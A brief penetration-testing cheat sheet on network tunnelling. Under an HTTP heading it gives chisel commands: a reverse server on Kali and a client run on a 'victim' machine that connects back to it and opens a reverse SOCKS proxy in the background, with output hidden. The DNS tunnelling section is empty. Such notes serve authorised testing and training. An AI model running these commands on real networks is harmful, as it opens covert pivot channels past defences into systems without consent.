# Tunnelling

# HTTP Tunnelling

## `chisel`
- Server: Kali (TCP/1080)
- Client: Victim
Start the server:
```
chisel server --port 8080 --reverse
```
Bind the client:
```
chisel client <srv-ip>:<srv-port> R:socks > /dev/null 2>&1 &
```


# DNS Tunnelling
